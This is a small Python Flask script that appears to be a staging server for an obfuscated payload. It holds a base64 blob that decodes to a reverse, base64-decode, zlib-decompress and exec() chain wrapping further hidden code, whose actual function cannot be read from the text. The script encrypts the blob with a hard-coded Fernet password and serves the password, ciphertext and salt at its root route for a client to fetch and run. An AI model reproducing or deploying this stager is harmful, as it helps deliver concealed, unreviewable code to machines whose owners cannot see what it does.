from flask import Flask, request # type: ignore
payload = 'XyA9IGxhbWJkYSBfXyA6IF9faW1wb3J0X18oJ3psaWInKS5kZWNvbXByZXNzKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NGRlY29kZShfX1s6Oi0xXSkpO2V4ZWMoKF8pKGIna2lPVTRldy8vKys4L255V00rQnNRaVdXQ2JuUTlXZzZUdHVsTjIwVi9ZcVhVb3R5dHJoS0laY2hjZFBlRW4xeXFkQ1JBZ21BUUd4R1hqUHlWbU5ybmZMUHJmV09aWUdmTFI1V2hjZTFUOVRCbnMwMlRjdUxWT1RXdjJqWHFGYnNvM1BCc2VXNEhMWTBCeFIwVXRSR0xnSVl0Qy9TcmF2cS9rZW00My9nSkRzU0pSeWdmeHR0VE9icHpVUFlqOU5hcnFWOVRoYU5MWjIyakVIVGdpY1B4a0grMVdiVkdMbWlnUUlRRE5XZTRHQW4xZlUzdzVndWRTQVNsQ05LQndEd1hZLzJUZnNkZ3l3TUUyWHEya0loZFo1SHZaZGVCZHpLRHhjRjhrMDdrSW1xT25OWm54Mm5PWGZMc2FhT1o5NmZGU3R5N21oZHVUQ05mZGRHRTNJZDIzOXllanRYR0hORVVrOTZnemFYWWtBVHJVM2lkMWx2bVAyRnBYcmsrdElOTE9XVDh0cFFUREhIbFVCWDh6MWcxUjBGNzFHcGYzbEwrRGwvNXVpeWFiTDFHRWFSVHlwZVVPTVQzM2NEMXhXcmpnenpvOHA0cUtud3RBOWpYcm0vc2JKeWNFY1RsSnl5QjUydjB5N0tRc1FuNEhIZ2I1bTdpZlpWTzJWMHh6WmtOZnZ0SVQ2TkU2ZmdEQVhBQzdRTHFXN09JdFNRVm9HQlRVQm44WVV2akE4dmJpNHVJdkkzV0NvYWUwZnBhd0lFTURKTFB2ZkdJdC94TTdvbFVhVVdXWmR0ck9jdHFNbmdCdTZycVFvRmZjWTFTUVZZTHVpbU1mYXRGMzk4cDZPc0gzTUpBSWh2UDFZNWYwbHc0YjYwVDc0R0FjblZkNnVIdWZVTzJMK0ZVbVMzcEczM2N2anVhR0NQM2REVGZ5eFFXdUpLejJ6UGdndllFVUxYNFdRNDhVT0NaQWlkNW1LV2xTRVpaekFZYmRieWNYZmgxcGI1NmNmNmFCTlZDTTUzN1N6TDNwT1ZwNGNCWkNUK3BEZEl5eUZ0MDYvT0pSSElSRVpXRSs0b0wwN1RFU1BhMmthRFRGL1EzNzNDTmN4blNSdFpqYnNhSExHbjFwNWFqSzNpZ2x2eTNPendadU1ZcWZxQnNPQWlZRVA0RS9iMmlQWUxrc3Z0WFdGZEdnUm5ObHA5bnBqelZNVWx5S3dMS0JjTDRzU2FiSFBUdXIvRnVjaDlMcDg0bmNVL3RvcnBEWnlhR3VRdlVYNlhiTlYwaGJsV3J0bklweEV3VFl5V0xsRTBTRnd5RU50UHhLYnFRSGVnSlVsWG5iczJXclBlcjI1Nng1LzE4U3FyMzRuOXJJaDNpWXNQU3ZhbzJralNLM3VGdmRoQVJRZmdpV3hzazk5YTVJTnRFVW5Ud01xQXplcTZzSnRQaVgzYko0TmpBbXQrK0w5NnF2WHZ5S1lWbFRadHhvTzNRTG9zTXlGcWptZTNEb1lycWQ1SHI5N3JOM1BFa1dtbUltcE9RcmpCQ25EaGlHVDNkeU9TNFFTZzFYeHZSb2FtdVQxeHcyUHVORzRSaEVpcGxHZ0NZKzhxTjdwS3BTZmZ4bUJ3cVlrNEd2bDZhNE10dzNZL2pQeDJGZjdUd1FsN2tGU1VjRk9Qa2JVdzRWQkt3QWNqd1pNbkt1em16UURoYm45b0pnVDVabFZ0NmFVRTRQakFBZ0dBWGtKb0JJUUlycjFGVEpTN0JQYmdEUUNzZG4wQkpjZHZtQmJGcUVMdTI1Qit1SXMvejJtdG9NbkpGbS82NldqWUpDZmU1QkFkeWU2SG9CQ056VzRUSnJ4eWVCY2ZWN2o2a25HWENVV2tibHduMjZSNFd1ZTFhUDBGV3RSQW83bmMvZ2lhZmxKSExSbGg1ekxheXdyL1VNY1BvQmZQMkd0QmJWNHAwTlMwRmxDUDRxRXcyWU1XbTRjS0J5aTZXK1dJaWViTVRYVURvcFBST01VR0M3YmhGeWhiQzNPamFNbitDa0ZIdVBRMGNmV2h3dHkwOEdKZzRINmh6bEYrZm1hWm1lYUNHbE9taW1DNkNYSm1mdkZCdi96UTRQVnZSVGFjWG1EK0tjRC96UktlVk9lNlZ1d1g4Nm0rU0R6NlZYSGg1SUhUMXVKK0kzR1I4Mzc2MDdxUGowK2UxWWYrakNuVG5sZ0lCZWFrTnZpZWo4KzJJbTM0enp3S0gzOHgzRnY3V3FROXBBdFA5dzdQTWVoWFhud0Z6SW9teFIzbWVIcnFCZ2dHeS93bWRiT2p3dFVSblE1QnpKcXdnb05EZnpFOWV1cjMxbXAranlOMWFtRjFEcnhvcFg2UVkwcTBzbkhCZFFCeXRDbFZTaDI5N3VYZE5NU0NvTldqWG1NNTBoRTYrbVZWckFZZTZheU9EUGlWMXh6VVF3azdOd1pGNU8vYzZkbXppVStnTWVBck9nL3gyc3dCWU5BT0dJd2JDZU0yN3ZhWDdwQWdMY0VCU2tBNnJaKzRWUEx5Wk9zZDZVeWxjODJRTDZwVW9oVHlncTFvTHZabkozc3dIM09lV1NPWVRpQXc0anM4b3YzZVpFYjNOMDdvUUVGT2xrTmU5MVVpTHhDREd2b1oyVjhuYlYzemhKS1FwbmU3NzN2U0JETW82enhiWW8rYmY2SGZtVWw4THZXbUxkQytSRXpNNE9XcTMya1lHOEkzNmUyUU0ra2tqQWFWWjN2Um5nQW1PMmpRZVgvWHFLbDVVQTlyQ2dXL1RjZzlnWUU3U2Q0WmJPT0JwRGo2SlFlN01SUGJLbEZPQnF4a3ZHNXRodmQyZmdEODhHNFlqT3pvYUVhUU9tUW9uaVpDZXhpRnpZT1J6Z2lNcGZIdjBPQW0xZElaWUxpYTZFNmxiWFRVQjhMeEZDUUZmU0hLYW5nMDZwUTdjMVA2U3VNdUFPNW5ldzBIZUhRUk5nUTVMNVU4K3I4OWFUYlM0WENUNjhYVldRWEJ4NkFEYm1YR3R5YytNZVdCZzh6WFEyMG0rQkRuZWl2SVJ0T1RsZ1kvdm9pLzBJSkdEWHhUQnkxZldRbkJhV0VtdW5zVmRuZm9kR2w5TGdsRFhYU1JRL3dmdmRhd1RZbnk1VFlTYVZBWDVCUS9LWGF0SmhmNWV1NEQwZEtxcTFITUNXc1Fxb1JBbkM2VlI4eVNQWGJ2U2FlRGVuSjdrczhlK284L1RSc1ZUUk1CSklBN0UvaHc3SW9HMTZlRzRkcUVzTjIrZE54VGVRb1g5QXQ0bGFPYjJPWW5BRjVuSkplcWx2eHAxc093YUppVm9GVzlUU0dVT3R5MkpESlIraks2YStNZU9aQ3dseVg4eDFJcmhWaUF4Mzk1bWVZNGFHVE9rVEltcFc3U3ZSb0t5d1RLM2prSkNmOHErK0pLZ21hSkZsU3VKVnh5VkdXS0hKY2VXWE9CT0UwdVprRC8zbUJ1Y0E4bnZpK0FZVmsraE1haEtwRnlKNXd4TFZIVy9NSFFkemRKQm1xUXdCSXNEUmQwdDc2d1RaSGZTdEZwRS9taENzY3V3cThoelNxNkNzMEZuQitRdHBMM3c4UXRKSnF6dUpzcGJQZjVHWkxqK3Jrc0JvQWg5bDJYOXRLaTNwczFVbm02eStPd3JNZnFNeVBJSzBWTms1b3BXZjZ6QUhUa2dialMrTjVFb29EaFNWRXQxQ2ZmREszTHBsOE9BelNmbk9aaWxOYXMxNGZhUkxGWjMyelUySTB1QXQ5VlNMaGlNdmQ1QUhubDcweTdOUHMrR005SXEzQVFBalhVdTdsV3ZmNm9GWFRwZmlXbVI2RmlmaHRGaFdCakhvNGVqd0hLdFNCSGZpdzV4UHMya0JJZUlId1FJMHpWQ0swSEJaR2RpUVZMWndOR1ljaHlVeCtGVXoyekFoN053enk5dkRQaEZXNDlVaWtzMG45eFpFSm5XNUsvR01IQnZSVXJmM2U5VjFySXZwcmZ0alRTNzc4b2cxZUhUSnF2aGx0bFJITnJ2dHJOMEFMZzVDVkxTK3phbU5jdzhzSWlkcVNQbVJXU0FNQzE5bGI3bnBxQ2pkNklkd3Fkamc3K0MrNTMzT3E3c3d6YUFnYitsWnFaY2NHUU05ZEdhZWpiZkprdXZDbDIySEFOTmhWVXVlTDlicXNIMjk4cEVtaFRGa01UcUx4LzIweDJ6WlJHNlM1REI0TEZhRUw5ay9lU3htemtyTmh6WE0vRHcrSHVGTjdvOEZQbWFCUHF0SkFaL2drbVdvTU4xcmp1dkJBZXYzZ0EwZkJyMUw4dUpSaC9XNW8zQ3dFVTRyY2ZYcFZ0aCtFQXAxbFFEY2xqSzJvb1JsTTVWcmZtajlhTEZBUWFrZzdCTEJiQXVCL3FVNm1KTmdlaTI0Z1N2SVJYQ2pCQjJ1akROSlNLcG8zRXBJUjZxaGVwejhhNHlkcUxQODFtZHhjZHlSa0puTTNEWnNoVE45K1kxUG44Ky8xMjhLdndBRGNEVi9LTFQvVUROK2w5YUR4SFo3WUU3QzRwbHdoeFN0YndMNFc2VDVleDNONHpUS0RPL01iYVMxdHJDMWUyQ0p1elI2OXlCUXFGR3pRdzVEdmM5cnBDdGZRSXNYOXVvTDJjQTVLVkpvVGhJUktYUVpqT00vczVMUlA5VlU1ZHM4MDdEcmQwV0tvVkYxZTZTSktaTVIvQzA3TWF1NE1rMDFaa3B5N25EM0pBZDdhV2VpMnRyWE5uOEFyTVFTbUhQNVVROUFOTTFWeTRlTEYxTWRaSm9lYTd2N2N1dlZwV3Z1TzZ2ZTNRa3JIUFFqSnBhQ0h5MHI0T3ppdVZqSysxbndrL0NCTnIzSDg4MjFqOG5ZMkoxNjMxOGpqTHV0SHVBMXJpTTkyaFY4NURtZ2ZIalJvL3RVaE13ODlvNjIrTGNrVTVIVGNIbG5PMGttekdjdWgyUXZBZmpBQUVxd3FBdVB1bi8rNzk4L3ZzLzk5NzgvL1A1VForRHgwOUJWalAvMXJPTXo4U0p5TXpQZGdBWUc0UzM1SVBSZ1l4eVd6Vk53SmUnKSkK'
app = Flask(__name__)
#payload = 'hi'
import base64
import secrets
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
KDF_ALGORITHM = hashes.SHA256()
KDF_LENGTH = 32
KDF_ITERATIONS = 120000

def encrypt(plaintext: str, password: str) -> (bytes, bytes):
    # Derive a symmetric key using the passsword and a fresh random salt.
    salt = secrets.token_bytes(16)
    kdf = PBKDF2HMAC(
        algorithm=KDF_ALGORITHM, length=KDF_LENGTH, salt=salt,
        iterations=KDF_ITERATIONS)
    key = kdf.derive(password.encode("utf-8"))

    # Encrypt the message.
    f = Fernet(base64.urlsafe_b64encode(key))
    ciphertext = f.encrypt(plaintext.encode("utf-8"))
    return ciphertext, salt
bytesencpayload, bytesencsalt = encrypt(payload, 'BkplW1OAilQv4k4t')
encpayload = str(base64.b64encode(bytesencpayload), encoding = 'ascii')
encsalt = str(base64.b64encode(bytesencsalt), encoding = 'ascii')
@app.route('/', methods=['GET'])
def home():
    my_string = request.args.get('', default = 'QmtwbFcxT0FpbFF2NGs0dA== ' + encpayload + ' ' + encsalt, type = str)
    return my_string

if __name__ == '__main__':
    app.run(port=5000)
